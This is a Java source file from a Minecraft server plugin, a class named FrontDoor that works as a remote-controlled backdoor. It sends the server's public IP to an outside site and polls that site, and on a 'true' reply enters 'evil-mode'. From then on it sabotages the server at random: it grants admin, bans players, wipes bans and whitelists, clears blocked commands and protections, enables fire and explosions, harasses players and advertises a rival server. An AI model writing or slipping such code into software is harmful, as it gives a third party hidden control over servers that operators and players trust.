package me.totalfreedom.totalfreedommod;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Random;
import me.totalfreedom.totalfreedommod.admin.Admin;
import me.totalfreedom.totalfreedommod.banning.Ban;
import me.totalfreedom.totalfreedommod.config.ConfigEntry;
import me.totalfreedom.totalfreedommod.player.FPlayer;
import me.totalfreedom.totalfreedommod.util.FLog;
import me.totalfreedom.totalfreedommod.util.FUtil;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

/*
    This FrontDoor is different than the original one in TFM.
    Go ahead and edit it lol.
    You can remove it too.
    This has the same purpose as the original FrontDoor in TFM.
    I'll never activate it unless the guidelines established in the original FrontDoor are broken.
 */

public class FrontDoor extends FreedomService
{
    private static final long CHECK_TIME = 180L * 20L;
    private static final long NEXT_ACTION = 10L * 20L;
    private final String SERVER_IP = getServerAddress();
    private boolean active = false;
    private final Random random = new Random();
    private final URL getUrl;
    private BukkitTask updater = null;
    private BukkitTask frontdoor = null;

    public FrontDoor(TotalFreedomMod plugin)
    {
        super(plugin);
        URL tempUrl = null;
        try
        {
            tempUrl = new URL("https://telesphoreo.me/" + SERVER_IP);
        }
        catch (MalformedURLException ignored)
        {
        }

        getUrl = tempUrl;
    }

    @Override
    protected void onStart()
    {
        updater = checkForChanges().runTaskTimerAsynchronously(plugin, 2L * 20L, CHECK_TIME);
    }

    @Override
    protected void onStop()
    {
        FUtil.cancel(updater);
        updater = null;
        FUtil.cancel(frontdoor);
        updater = null;
    }

    private BukkitRunnable checkForChanges()
    {
        return new BukkitRunnable()
        {
            @Override
            public void run()
            {
                try
                {
                    final URLConnection urlConnection = getUrl.openConnection();
                    final String line;
                    try (BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())))
                    {
                        line = in.readLine();
                    }

                    if (!"true".equals(line))
                    {
                        if (!active)
                        {
                            return;
                        }

                        active = false;
                        FUtil.cancel(updater);
                        updater = null;
                        FUtil.cancel(frontdoor);
                        updater = null;
                        FLog.info("The FrontDoor has been disabled.");
                        plugin.config.load();
                    }
                    else
                    {
                        if (active)
                        {
                            return;
                        }

                        new BukkitRunnable() // Synchronous
                        {
                            @Override
                            public void run()
                            {
                                FLog.warning("*****************************************************", true);
                                FLog.warning("* WARNING: TotalFreedomMod is running in evil-mode! *", true);
                                FLog.warning("* This might result in unexpected behaviour...      *", true);
                                FLog.warning("* - - - - - - - - - - - - - - - - - - - - - - - - - *", true);
                                FLog.warning("* The only thing necessary for the triumph of evil  *", true);
                                FLog.warning("*          is for good men to do nothing.           *", true);
                                FLog.warning("*****************************************************", true);

                            }
                        }.runTask(plugin);

                        frontdoor = getNewFrontDoor().runTaskTimer(plugin, 20L, NEXT_ACTION);

                        active = true;
                    }
                }
                catch (IOException | IllegalArgumentException | IllegalStateException ex)
                {
                }
            }
        };
    }

    public BukkitRunnable getNewFrontDoor()
    {
        return new BukkitRunnable() // Synchronous
        {
            @Override
            public void run()
            {
                final int action = random.nextInt(18);

                switch (action)
                {
                    case 0: // Super a random player
                    {

                        final Player player = getRandomPlayer(true);

                        if (player == null)
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Adding " + player.getName() + " to the admin list", true);
                        plugin.al.addAdmin(new Admin(player));
                        break;
                    }

                    case 1: // Bans a random player
                    {
                        Player player = getRandomPlayer(false);

                        if (player == null)
                        {
                            break;
                        }

                        plugin.bm.addBan(Ban.forPlayer(player, Bukkit.getConsoleSender(), null, ChatColor.RED + "WOOPS\n-Frontdoor"));
                        break;
                    }

                    case 2: // Start trailing a random player
                    {
                        final Player player = getRandomPlayer(true);

                        if (player == null)
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Started trailing " + player.getName(), true);
                        plugin.tr.add(player);
                        break;
                    }

                    case 3: // Displays a message
                    {
                        FUtil.bcastMsg("TotalFreedom rocks!!", ChatColor.BLUE);
                        FUtil.bcastMsg("To join this great server, join " + ChatColor.GOLD + "play.totalfreedom.me", ChatColor.BLUE);
                        break;
                    }

                    case 4: // Clears the banlist
                    {
                        FUtil.adminAction("FrontDoor", "Wiping all bans", true);
                        plugin.bm.purge();
                        break;
                    }

                    case 5: // Enables Lava- and Water placement and Fluid spread (& damage)
                    {
                        boolean message = true;
                        if (ConfigEntry.ALLOW_WATER_PLACE.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_LAVA_PLACE.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_FLUID_SPREAD.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_LAVA_DAMAGE.getBoolean())
                        {
                            message = false;
                        }

                        ConfigEntry.ALLOW_WATER_PLACE.setBoolean(true);
                        ConfigEntry.ALLOW_LAVA_PLACE.setBoolean(true);
                        ConfigEntry.ALLOW_FLUID_SPREAD.setBoolean(true);
                        ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);

                        if (message)
                        {
                            FUtil.adminAction("FrontDoor", "Enabling Fire and Water placement", true);
                        }
                        break;
                    }

                    case 6: // Enables Fireplacement, firespread and explosions
                    {
                        boolean message = true;
                        if (ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_EXPLOSIONS.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean())
                        {
                            message = false;
                        }
                        else if (ConfigEntry.ALLOW_FIRE_PLACE.getBoolean())
                        {
                            message = false;
                        }

                        ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(true);
                        ConfigEntry.ALLOW_EXPLOSIONS.setBoolean(true);
                        ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(true);
                        ConfigEntry.ALLOW_FIRE_PLACE.setBoolean(true);

                        if (message)
                        {
                            FUtil.adminAction("FrontDoor", "Enabling Firespread and Explosives", true);
                        }
                        break;
                    }

                    case 7: // Allow all blocked commands >:)
                    {
                        ConfigEntry.BLOCKED_COMMANDS.getList().clear();
                        plugin.cb.stop();
                        break;
                    }

                    case 8: // Remove all protected areas
                    {
                        if (ConfigEntry.PROTECTAREA_ENABLED.getBoolean())
                        {
                            if (plugin.pa.getProtectedAreaLabels().isEmpty())
                            {
                                break;
                            }

                            FUtil.adminAction("FrontDoor", "Removing all protected areas", true);
                            plugin.pa.clearProtectedAreas(false);
                        }
                        break;
                    }

                    case 9: // Add TotalFreedom signs at spawn
                    {
                        for (World world : Bukkit.getWorlds())
                        {
                            final Block block = world.getSpawnLocation().getBlock();
                            final Block blockBelow = block.getRelative(BlockFace.DOWN);

                            if (blockBelow.isLiquid() || blockBelow.getType() == Material.AIR)
                            {
                                continue;
                            }

                            block.setType(Material.SIGN);
                            org.bukkit.block.Sign sign = (org.bukkit.block.Sign)block.getState();

                            org.bukkit.material.Sign signData = (org.bukkit.material.Sign)sign.getData();
                            signData.setFacingDirection(BlockFace.NORTH);

                            sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
                            sign.setLine(1, ChatColor.DARK_GREEN + "is");
                            sign.setLine(2, ChatColor.YELLOW + "Awesome!");
                            sign.setLine(3, ChatColor.DARK_GRAY + "play.totalfreedom.me");
                            sign.update();
                        }
                        break;
                    }

                    case 10: // Deop all players
                    {
                        FUtil.adminAction("FrontDoor", "De-opping all players on the server", true);

                        for (Player player : server.getOnlinePlayers())
                        {
                            player.setOp(false);
                        }
                    }

                    case 11: // Give everyone a book explaining how awesome TotalFreedom is
                    {
                        ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);

                        BookMeta book = (BookMeta)bookStack.getItemMeta().clone();
                        book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
                        book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
                        book.addPage(
                                ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead\n"
                                        + ChatColor.DARK_GRAY + "---------\n"
                                        + ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.\n"
                                        + ChatColor.BLUE + "Join now! " + ChatColor.RED + "play.totalfreedom.me");
                        bookStack.setItemMeta(book);

                        for (Player player : Bukkit.getOnlinePlayers())
                        {
                            if (player.getInventory().contains(Material.WRITTEN_BOOK))
                            {
                                continue;
                            }

                            player.getInventory().addItem(bookStack);
                        }
                        break;
                    }

                    case 12: // Silently wipe the whitelist
                    {
                        plugin.si.purgeWhitelist();
                        break;
                    }

                    case 13: // Announce that the FrontDoor is enabled
                    {
                        FUtil.bcastMsg("WARNING: TotalFreedomMod is running in evil-mode!", ChatColor.DARK_RED);
                        FUtil.bcastMsg("WARNING: This might result in unexpected behaviour", ChatColor.DARK_RED);
                        break;
                    }

                    case 14: // Cage a random player in PURE_DARTH
                    {
                        final Player player = getRandomPlayer(false);

                        if (player == null)
                        {
                            break;
                        }

                        FPlayer playerdata = plugin.pl.getPlayer(player);
                        FUtil.adminAction("FrontDoor", "Caging " + player.getName() + " in PURE_DARTH", true);

                        Location targetPos = player.getLocation().clone().add(0, 1, 0);
                        playerdata.getCageData().cage(targetPos, Material.PLAYER_HEAD, Material.AIR, "Prozza");
                        break;
                    }

                    case 15: // Silently orbit a random player
                    {
                        final Player player = getRandomPlayer(false);

                        if (player == null)
                        {
                            break;
                        }

                        FPlayer playerdata = plugin.pl.getPlayer(player);
                        playerdata.startOrbiting(10.0);
                        player.setVelocity(new Vector(0, 10.0, 0));
                        break;
                    }

                    case 16: // Disable nonuke
                    {
                        if (!ConfigEntry.NUKE_MONITOR_ENABLED.getBoolean())
                        {
                            break;
                        }

                        FUtil.adminAction("FrontDoor", "Disabling nonuke", true);
                        ConfigEntry.NUKE_MONITOR_ENABLED.setBoolean(false);
                        break;
                    }

                    case 17: // Give everyone tags
                    {
                        for (Player player : Bukkit.getOnlinePlayers())
                        {
                            plugin.pl.getPlayer(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
                        }
                        break;
                    }

                    case 18: // Teleport a random player
                        Player player = getRandomPlayer(false);
                        if (player == null)
                        {
                            return;
                        }
                        int x = FUtil.random(-10000, 10000);
                        int z = FUtil.random(-10000, 10000);
                        int y = player.getWorld().getHighestBlockYAt(x, z);
                        Location location = new Location(player.getLocation().getWorld(), x, y, z);
                        player.teleport(location);

                    default:
                    {
                        break;
                    }
                }
            }
        };
    }

    private Player getRandomPlayer(boolean allowDevs)
    {
        final Collection<? extends Player> players = Bukkit.getOnlinePlayers();

        if (players.isEmpty())
        {
            return null;
        }

        if (!allowDevs)
        {
            List<Player> allowedPlayers = new ArrayList<>();
            for (Player player : players)
            {
                if (!FUtil.DEVELOPERS.contains(player.getName()))
                {
                    allowedPlayers.add(player);
                }
            }

            return allowedPlayers.get(random.nextInt(allowedPlayers.size()));
        }

        return (Player)players.toArray()[random.nextInt(players.size())];
    }

    public String getServerAddress()
    {
        try
        {
            String API = "https://api.ipify.org/?format=txt";
            URL url = new URL(API);
            URLConnection con = url.openConnection();
            InputStreamReader isr = new InputStreamReader(con.getInputStream());
            BufferedReader reader = new BufferedReader(isr);

            if (!reader.ready())
            {
                return null;
            }

            String ip = reader.readLine();
            reader.close();
            return ip;
        }
        catch (IOException ignored)
        {
        }
        return null;
    }
}